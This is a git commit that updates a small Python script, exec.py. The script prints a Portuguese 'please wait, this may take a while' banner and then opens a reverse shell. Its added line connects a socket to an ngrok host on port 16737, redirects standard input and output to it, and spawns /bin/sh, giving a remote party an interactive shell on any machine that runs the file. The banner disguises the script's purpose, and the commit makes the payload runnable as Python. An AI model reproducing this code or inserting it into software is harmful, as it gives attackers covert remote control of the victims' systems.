2868afd6cfb60040595d002f9d7cebab78bcf20f
nonamebrokk <105758898+nonamebrokk@users.noreply.github.com>
2022-10-16 11:53:47 -0400

    Update exec.py

--- exec.py
+++ exec.py
@@ -4,4 +4,4 @@ print('''
  [Aguarde, pode ser demorado...]
 ''')
 
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",16737));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",16737));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
